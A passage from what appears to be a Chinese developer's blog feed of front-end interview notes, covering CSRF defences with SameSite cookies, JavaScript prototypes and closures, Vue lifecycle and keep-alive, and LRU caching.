可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。 在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的。</p><p><strong>（3）SameSite Cookie</strong></p><p>Set-Cookie 响应头新增 SameSite 属性，它用来标明这个 cookie 是个“同站 cookie”，同站 cookie 只能作为第一方 cookie，不能作为第三方 cookie。SameSite 有两个属性值，分别是 Strict 和 Lax</p><p> <code>Strict</code>最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。 </p><p><code>Lax</code>规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。 </p><h3 id="goole浏览器中对cookie的设置"><a href="#goole浏览器中对cookie的设置" class="headerlink" title="goole浏览器中对cookie的设置"></a>goole浏览器中对cookie的设置</h3><h4 id="SameSite-by-default-cookies"><a href="#SameSite-by-default-cookies" class="headerlink" title="SameSite by default cookies"></a>SameSite by default cookies</h4><blockquote><p>Treat cookies that don’t specify a SameSite attribute as if they were SameSite=Lax. Sites must specify SameSite=None in order to enable third-party usage. – Mac, Windows, Linux, Chrome OS, Android</p><p>将未指定SameSite属性的cookie视为SameSite=Lax(默认),网站必须指定SameSite=None才能启用第三方cookie。<br>把这个设置关了就允许所有的第三方cookie</p></blockquote><h4 id="Cookies-without-SameSite-must-be-secure"><a href="#Cookies-without-SameSite-must-be-secure" class="headerlink" title="Cookies without SameSite must be secure"></a>Cookies without SameSite must be secure</h4><blockquote><p>If enabled, cookies without SameSite restrictions must also be Secure. If a cookie without SameSite restrictions is set without the Secure attribute, it will be rejected. This flag only has an effect if “SameSite by default cookies” is also enabled. – Mac, Windows, Linux, Chrome OS, Android</p><p>如果启用，没有SameSite限制的cookie也必须是安全的。如果没有设置SameSite限制的cookie没有Secure属性，它将被拒绝。此标志仅在启用’sameSite by default cookies’时有效。</p></blockquote><p>如果你想加 SameSite=none 属性，那么该 Cookie 就必须同时加上 Secure 属性，表示只有在 HTTPS 协议下该 Cookie 才会被发送。 </p><p>SameSite 可以有下面三种值：</p><blockquote><ol><li>Strict 仅允许一方请求携带 Cookie，即浏览器将只发送相同站点请求的 Cookie，即当前网页 URL 与请求目标 URL 完全一致。</li><li>Lax 允许部分第三方请求携带 Cookie</li><li>None 无论是否跨站都会发送 Cookie</li></ol></blockquote><p>之前默认是 None 的，Chrome80 后默认是 Lax</p><h2 id="html5的标签"><a href="#html5的标签" class="headerlink" title="html5的标签"></a>html5的标签</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span class="token punctuation">></span></span>:定义区段或页面的页脚.(足部)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span><span class="token punctuation">></span></span>:定义文档中的区段.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>article</span><span class="token punctuation">></span></span>:定义文章.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>aside</span><span class="token punctuation">></span></span>:定义页面内容之外的内容.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>details</span><span class="token punctuation">></span></span>:定义元素的细节.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>audio</span><span class="token punctuation">></span></span>:定义声音内容.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span><span class="token punctuation">></span></span>:定义视频.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span><span class="token punctuation">></span></span>:内联框架.</code></pre><h2 id="数组和链表的对比"><a href="#数组和链表的对比" class="headerlink" title="数组和链表的对比"></a>数组和链表的对比</h2><p>数组存储方式采用线性结构，声明数组时需要声明类型，并且大小也会固定：</p><ul><li>优点：</li></ul><p>　　　　因此访问数组元素可根据数组下标随机访问，O(1).</p><ul><li>缺点：</li></ul><p>　　　　大小固定，可能会造成空间浪费，或空间不够影响程序运行；</p><p>　　　　插入和删除元素却比较麻烦，可能需要移动部分数组元素以保证数组元素的物理位置保持连续。</p><p>链表采用链式存储结构，在声明时只需声明结构类型，：</p><ul><li>优点：</li></ul><p>　　　　链表大小在实际使用中可以动态增大和减小；</p><p>　　　　插入和删除操作就很方便，只需修改该元素节点邻接元素即可O(1).</p><ul><li>缺点：</li></ul><p>　　　　访问元素比较费时，需要逐个节点进行查看或能找到目标元素。</p><h2 id="怎么实现轮播图"><a href="#怎么实现轮播图" class="headerlink" title="怎么实现轮播图"></a>怎么实现轮播图</h2><pre class=" language-JS"><code class="language-JS">// 若果有在等待的定时器，则清掉if (timer) {    clearInterval(timer);    timer = null;}//自动切换timer = setInterval(autoPlay, 4000);//定义自动播放函数function autoPlay() {    index++;    if (list.length <=index) {        index = 0;    }    changeImg(index);    // alert("我正在autoplay");}// 定义图片切换函数（根据当前的index值也就是curindex）function changeImg(curIndex) {    for (var j = 0; j < list.length; j++) {        list[j].className = "";    }    // 改变当前显示索引    list[curIndex].className = "on";    pic.style.marginLeft = -1920 * curIndex + "px";    index = curIndex;}// 鼠标划过整个容器时停止自动播放wrap.onmouseover = function(curIndex) {    clearInterval(timer);    //点击右按钮}// 鼠标离开整个容器时继续播放至下一张wrap.onmouseout = function() {    timer = setInterval(autoPlay, 4000);    // alert("鼠标移走了");}// 遍历所有数字导航实现划过切换至对应的图片for (var i = 0; i < list.length; i++) {    list[i].id = i;    list[i].onmouseover = function() {        clearInterval(timer);        changeImg(this.id);    }}</code></pre><h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><blockquote><p>每个对象都有一个指向它的原型（prototype）对象的内部链接。这个原型对象又有自己的原型，直到某个对象的原型为 null 为止（也就是不再有原型指向），组成这条链的最后一环。这种一级一级的链结构就称为原型链（prototype chain）。</p></blockquote><ul><li><p><a href="https://www.jinjingxuan.com/2018/09/19/JavaScript-%E5%8E%9F%E5%9E%8B%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/" target="_blank" rel="noopener">原型和原型链</a></p><h2 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h2></li></ul><blockquote><p>instanceof 运算符用来测试一个对象在其原型链中是否存在一个构造函数的 prototype 属性。<br>A instanceof B<br>//判断 B 的 prototype 属性指向的原型对象(B.prototype)是否在对象 A 的原型链上。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">_instanceof</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span> R<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//L为instanceof左表达式，R为右表达式</span>  <span class="token keyword">let</span> Ro <span class="token operator">=</span> R<span class="token punctuation">.</span>prototype <span class="token comment" spellcheck="true">//原型</span>  L <span class="token operator">=</span> L<span class="token punctuation">.</span>__proto__ <span class="token comment" spellcheck="true">//隐式原型</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>L <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//当到达L原型链顶端还未匹配，返回false</span>      <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>L <span class="token operator">===</span> Ro<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//全等时，返回true</span>      <span class="token keyword">return</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span>    L <span class="token operator">=</span> L<span class="token punctuation">.</span>__proto__  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> num <span class="token operator">=</span> <span class="token number">1</span>num<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> Number<span class="token punctuation">.</span>prototype <span class="token comment" spellcheck="true">// true</span>num <span class="token keyword">instanceof</span> <span class="token class-name">Number</span> <span class="token comment" spellcheck="true">// false</span>num <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Number</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>num<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> Number<span class="token punctuation">.</span>prototype <span class="token comment" spellcheck="true">// true</span>num <span class="token keyword">instanceof</span> <span class="token class-name">Number</span> <span class="token comment" spellcheck="true">// true</span>num<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Number</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__proto__ <span class="token comment" spellcheck="true">// true</span></code></pre><pre class=" language-js"><code class="language-js">Object <span class="token keyword">instanceof</span> <span class="token class-name">Object</span> <span class="token comment" spellcheck="true">// true</span>Function <span class="token keyword">instanceof</span> <span class="token class-name">Function</span> <span class="token comment" spellcheck="true">// true</span>Function <span class="token keyword">instanceof</span> <span class="token class-name">Object</span> <span class="token comment" spellcheck="true">// true</span>Number <span class="token keyword">instanceof</span> <span class="token class-name">Number</span> <span class="token comment" spellcheck="true">// false</span>String <span class="token keyword">instanceof</span> <span class="token class-name">String</span> <span class="token comment" spellcheck="true">// false</span><span class="token comment" spellcheck="true">// Object和Function都是构造函数，而所有的构造函数都是Function的实例，因此，Object是Function的实例对象。</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object <span class="token keyword">instanceof</span> <span class="token class-name">Function</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Number <span class="token keyword">instanceof</span> <span class="token class-name">Function</span><span class="token punctuation">)</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>String <span class="token keyword">instanceof</span> <span class="token class-name">Function</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Function <span class="token keyword">instanceof</span> <span class="token class-name">Function</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Function <span class="token keyword">instanceof</span> <span class="token class-name">Object</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object <span class="token keyword">instanceof</span> <span class="token class-name">Object</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Number <span class="token keyword">instanceof</span> <span class="token class-name">Object</span><span class="token punctuation">)</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>String <span class="token keyword">instanceof</span> <span class="token class-name">Object</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Function <span class="token keyword">instanceof</span> <span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 均为 true</span></code></pre><ul><li><p><a href="https://pic2.zhimg.com/80/dcd9f21f6457d284950b767e6f7bdea3_720w.jpg?source=1940ef5c" target="_blank" rel="noopener">Object和Function图示</a></p><h2 id="数组扁平化带深度参数"><a href="#数组扁平化带深度参数" class="headerlink" title="数组扁平化带深度参数"></a>数组扁平化带深度参数</h2></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">flattern</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span>depth<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> item <span class="token keyword">of</span> list<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span>depth<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token function">flattern</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>depth<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 写一个函数，将传进去的数组按深度展开</span>list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">// depth 等于 1 时输出</span><span class="token comment" spellcheck="true">//depth = 1 :[1,2,3,4,5,6,[7,8],9,10,11]</span><span class="token comment" spellcheck="true">// depth 等于 2 时输出</span><span class="token comment" spellcheck="true">//depth = 2 :[1,2,3,4,5,6,7,8,9,10,11]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">flattern</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">flattern</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="for-循环的问题怎么解决"><a href="#for-循环的问题怎么解决" class="headerlink" title="for 循环的问题怎么解决"></a>for 循环的问题怎么解决</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>第一个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>第二个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>第三个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>第四个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>    let oli = document.getElementsByTagName("li")    for(var i=0;i&lt;4;i++){        oli[i].onclick = function(){            console.log(i)        }    }    // //相当于    var i    i=0    oli[0].onclick = function(){        console.log(i)    }    i=1    oli[1].onclick = function(){        console.log(i)    }    i=2    oli[2].onclick = function(){        console.log(i)    }    i=3    oli[3].onclick = function(){        console.log(i)    }    //按照词法作用域查找，会每次都找到全局的i    //方法一：改为let    for(let i=0;i&lt;4;i++){        oli[i].onclick = function(){            console.log(i)        }    }    //let声明了一个块级作用域，以上相当于    for(let i=0;i&lt;4;i++){        let i = //隐藏作用域里的i            oli[i].onclick = function(){                console.log(i)            }        }    //这个时候在执行点击事件时，i会在for循环的第一行找到i的值    //方法二：闭包    for(var i=0;i&lt;4;i++){        (function(i){            oli[i].onclick = function(){                console.log(i)            }        })(i)    }    //方法三：暂存数据,和let原理类似    for(var i=0;i&lt;4;i++){        oli[i].index = i        oli[i].onclick = function(){            console.log(this.index)        }    }    //方法四：事件委托    var oul = document.getElementsByTagName("ul")[0];    oul.onclick = function(e){        var e = e || window.event        var target = e.target || e.srcElement        if(target.nodeName.toLowerCase() == 'li'){            var li=this.querySelectorAll("li");            var index = Array.prototype.indexOf.call(li,target);            console.log(index);        }    }</code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token string">'foo'</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//foo foo foo</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面试题（十）</title>
      <link href="2018/08/03/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E5%8D%81%EF%BC%89/"/>
      <url>2018/08/03/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E5%8D%81%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>call, apply, bind 的区别？怎么实现</li><li>介绍一下vue的生命周期</li><li>16进制颜色转换为rgb</li><li>keep-alive了解吗</li><li>聊聊LRU算法</li><li>Vue中组件生命周期调用顺序</li><li>你都做过哪些Vue的性能优化</li><li>npm install 原理</li><li>Map,weakMap,Set,weakSet</li><li>什么是尾递归</li><li>link 与 @import 的区别</li><li>数组 <code>map()</code> 和 <code>forEach()</code> 方法的区别？</li><li>什么是静态网站</li></ul><h2 id="call-apply-bind-的区别？怎么实现"><a href="#call-apply-bind-的区别？怎么实现" class="headerlink" title="call, apply, bind 的区别？怎么实现"></a>call, apply, bind 的区别？怎么实现</h2><blockquote><p>都是用来改变函数的 this 对象的指向的。</p><p>第一个参数都是 this 要指向的对象。</p><p>都可以利用后续参数传参。 区别：</p><p>call 接受函数传参方式为：fn.call(this, 1, 2, 3)</p><p>apply 接受函数传参方式为：fn.apply(this,[1, 2, 3])</p><p>bind 的返回值为一个新的函数，需要再次调用： fn.bind(this)(1, 2, 3)</p></blockquote><ul><li><a href="https://www.jinjingxuan.com/2020/03/20/%E9%9D%A2%E8%AF%95-%E6%89%8B%E5%86%99%E4%BB%A3%E7%A0%81%E6%95%B4%E7%90%86/" target="_blank" rel="noopener">手写代码整理</a></li></ul><h2 id="vue的生命周期"><a href="#vue的生命周期" class="headerlink" title="vue的生命周期"></a>vue的生命周期</h2><h3 id="beforeCreate-创建前"><a href="#beforeCreate-创建前" class="headerlink" title="beforeCreate( 创建前 )"></a>beforeCreate( 创建前 )</h3><p>使用这个钩子，组件的选项对象并没有创建，el和data都还没初始化，所以data、methods和computed等都用不了。一般用来在组件挂在之前渲染一些东西。</p><h3 id="created-创建后-）"><a href="#created-创建后-）" class="headerlink" title="created ( 创建后 ）"></a>created ( 创建后 ）</h3><p>这时候上面的data、methods、computed都已经创建完成了，数据观测，属性和方法的运算，watch/event事件回调都完成了，但这时候挂载阶段mount还没开始，是el并没有完成。这是最常用的生命周期钩子，可以调用methods中的方法，改变data中的数据，并且修改可以通过vue的响应式绑定体现在页面上，，获取computed中的计算属性等等，通常我们可以在这里对实例进行预处理，也在这里发ajax请求，这个周期中是没有什么方法来对实例化过程进行拦截的，因此假如有某些数据必须获取才允许进入页面的话，并不适合在这个方法发请求，建议在组件路由钩子beforeRouteEnter（路由守卫）中完成</p><h3 id="beforeMount（挂载之前）"><a href="#beforeMount（挂载之前）" class="headerlink" title="beforeMount（挂载之前）"></a>beforeMount（挂载之前）</h3><p>挂载之前被调用，render（渲染）函数首次被调用（虚拟DOM），这里已经完成了模板编译，data里面的数据和模板会生产HTML，这里el也完成了，但并没有挂载到html页面上。</p><h3 id="mounted（挂载）"><a href="#mounted（挂载）" class="headerlink" title="mounted（挂载）"></a>mounted（挂载）</h3><p>挂载完成了，这时候HTML模板会被渲染到HTML中，还可以做一些ajax操作。但mounted只能执行一次。</p><h3 id="beforeUpdate（更新之前）"><a href="#beforeUpdate（更新之前）" class="headerlink" title="beforeUpdate（更新之前）"></a>beforeUpdate（更新之前）</h3><p>更新指数据更新，发生在虚拟DOM重新渲染和补丁之前，在这个钩子中可以更改状态而不发生重绘。</p><h3 id="updated（更新后）"><a href="#updated（更新后）" class="headerlink" title="updated（更新后）"></a>updated（更新后）</h3><p>在由于数据更改导致地虚拟DOM重新渲染和打补丁只会调用，调用时，组件DOM已经更新，所以可以执行依赖于DOM的操作，然后在大多是情况下，应该避免在此期间更改状态，因为这可能会导致更新无限循环，该钩子在服务器端渲染期间不被调用</p><h3 id="beforeDestroy（销毁前）"><a href="#beforeDestroy（销毁前）" class="headerlink" title="beforeDestroy（销毁前）"></a>beforeDestroy（销毁前）</h3><p>在实例销毁前调用，但实例还可以用。</p><p>这里还可以使用this，一般用来做重置操作，比如清除定时器和DOM监听事件。</p><h3 id="destroyed（销毁后）"><a href="#destroyed（销毁后）" class="headerlink" title="destroyed（销毁后）"></a>destroyed（销毁后）</h3><p>在实例销毁之后调用，调用后，所以的事件监听器会被移出，所有的子实例也会被销毁，该钩子在服务器端渲染期间不被调用</p><h2 id="16进制颜色转换为rgb"><a href="#16进制颜色转换为rgb" class="headerlink" title="16进制颜色转换为rgb"></a>16进制颜色转换为rgb</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">hex2rgb</span><span class="token punctuation">(</span>hex<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> str <span class="token operator">=</span> hex<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> w <span class="token keyword">of</span> str<span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>w <span class="token operator">+</span> w<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">;</span> i <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> str<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span></code></pre><h2 id="keep-alive了解吗"><a href="#keep-alive了解吗" class="headerlink" title="keep-alive了解吗"></a>keep-alive了解吗</h2><blockquote><p>keep-alive是一个抽象组件：它自身不会渲染一个 DOM 元素，也不会出现在父组件链中；使用keep-alive包裹动态组件时，会缓存不活动的组件实例，而不是销毁它们。</p></blockquote><h3 id="一个场景"><a href="#一个场景" class="headerlink" title="一个场景"></a>一个场景</h3><p>用户在某个列表页面选择筛选条件过滤出一份数据列表，由列表页面进入数据详情页面，再返回该列表页面，我们希望：列表页面可以保留用户的筛选（或选中）状态。keep-alive就是用来解决这种场景。当然keep-alive不仅仅是能够保存页面/组件的状态这么简单，它还可以避免组件反复创建和渲染，有效提升系统性能。 总的来说，keep-alive用于保存组件的渲染状态</p><blockquote><p><code>keep-alive</code>可以实现组件缓存，当组件切换时不会对当前组件进行卸载。</p><p>常用的两个属性<code>include/exclude</code>，允许组件有条件的进行缓存。</p><p>两个生命周期<code>activated/deactivated</code>，用来得知当前组件是否处于活跃状态。</p><p>keep-alive的中还运用了<code>LRU(Least Recently Used)</code>算法。</p><p>使用 vue-des-tools 可以查看当前组件是否缓存</p></blockquote><p><code>&lt;keep-alive&gt;</code> 是一个抽象组件，</p><ul><li>首次渲染的时候设置缓存</li><li>缓存渲染的时候不会执行组件的 created、mounted 等钩子函数, 而是对缓存的组件执行patch 过程，最后直接更新到目标元素。</li></ul><p>使用 LRU 缓存策略对组件进行缓存</p><ul><li>命中缓存，则直接返回缓存，同时更新缓存key的位置</li><li>不命中缓存则设置进缓存，同时检查缓存的实例数量是否超过 max</li></ul><ul><li><a href="https://juejin.cn/post/6844903919273918477" target="_blank" rel="noopener">Vue keep-alive深入理解及实践总结</a></li><li><a href="https://segmentfault.com/a/1190000022248237" target="_blank" rel="noopener">keep-alive的实现原理及LRU缓存策略</a></li><li><a href="https://segmentfault.com/a/1190000019975188" target="_blank" rel="noopener">vue多级菜单(路由)导致缓存(keep-alive)失效</a></li></ul><h2 id="聊聊LRU算法"><a href="#聊聊LRU算法" class="headerlink" title="聊聊LRU算法"></a>聊聊LRU算法</h2><blockquote><p>操作系统内存管理：分页，分段，段页结合</p><p>LRU（最近最久未使用）属于页面置换算法中的一种，其他还有 FIFO（先进先出算法），OPT（最佳置换算法）等等</p></blockquote><p><a href="https://blog.csdn.net/jankin6/article/details/78179320" target="_blank" rel="noopener">操作系统页面置换算法</a></p><p><a href="https://leetcode-cn.com/problems/lru-cache/" target="_blank" rel="noopener">leetcode146：LRU缓存机制</a></p><p><a href="https://leetcode-cn.com/problems/lru-cache/solution/146-lru-huan-cun-ji-zhi-shuang-xiang-lian-biao-ha-/" target="_blank" rel="noopener">题解</a></p><h2 id="Vue中组件生命周期调用顺序"><a href="#Vue中组件生命周期调用顺序" class="headerlink" title="Vue中组件生命周期调用顺序"></a>Vue中组件生命周期调用顺序</h2><p>组件的调用顺序都是<code>先父后子</code>,渲染完成的顺序是<code>先子后父</code>。</p><p>组件的销毁操作是<code>先父后子</code>，销毁完成的顺序是<code>先子后父</code>。</p><h3 id="加载渲染过程"><a href="#加载渲染过程" class="headerlink" title="加载渲染过程"></a>加载渲染过程</h3><pre class=" language-js"><code class="language-js">父beforeCreate<span class="token operator">-</span><span class="token operator">></span>父created<span class="token operator">-</span><span class="token operator">></span>父beforeMount<span class="token operator">-</span><span class="token operator">></span>子beforeCreate<span class="token operator">-</span><span class="token operator">></span>子created<span class="token operator">-</span><span class="token operator">></span>子beforeMount<span class="token operator">-</span> <span class="token operator">></span>子mounted<span class="token operator">-</span><span class="token operator">></span>父mounted</code></pre><h3 id="子组件更新过程"><a href="#子组件更新过程" class="headerlink" title="子组件更新过程"></a>子组件更新过程</h3><pre class=" language-js"><code class="language-js">父beforeUpdate<span class="token operator">-</span><span class="token operator">></span>子beforeUpdate<span class="token operator">-</span><span class="token operator">></span>子updated<span class="token operator">-</span><span class="token operator">></span>父updated</code></pre><h3 id="父组件更新过程"><a href="#父组件更新过程" class="headerlink" title="父组件更新过程"></a>父组件更新过程</h3><pre class=" language-js"><code class="language-js">父 beforeUpdate <span class="token operator">-</span><span class="token operator">></span> 父 updated</code></pre><h3 id="销毁过程"><a href="#销毁过程" class="headerlink" title="销毁过程"></a>销毁过程</h3><pre class=" language-js"><code class="language-js">父beforeDestroy<span class="token operator">-</span><span class="token operator">></span>子beforeDestroy<span class="token operator">-</span><span class="token operator">></span>子destroyed<span class="token operator">-</span><span class="token operator">></span>父destroyed</code></pre><h2 id="你都做过哪些Vue的性能优化"><a href="#你都做过哪些Vue的性能优化" class="headerlink" title="你都做过哪些Vue的性能优化"></a>你都做过哪些Vue的性能优化</h2><ul><li>尽量减少data中的数据，data中的数据都会增加getter和setter，会收集对应的watcher</li><li><p>v-if和v-for不能连用</p><ul><li>当 Vue 处理指令时，v-for 比 v-if 具有更高的优先级（vue3中反了过来）</li><li>哪怕我们只渲染出一小部分用户的元素，也得在每次重渲染的时候遍历整个列表，不论活跃用户是否发生了变化。</li><li>具体看<a href="https://juejin.cn/post/6844904052371767309" target="_blank" rel="noopener">这篇文章</a></li></ul></li><li><p>SPA 页面采用keep-alive缓存组件</p></li><li><a href="https://www.jinjingxuan.com/2018/08/03/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E5%85%AB%EF%BC%89/" target="_blank" rel="noopener">v-if与v-show</a></li><li>key保证唯一</li><li><a 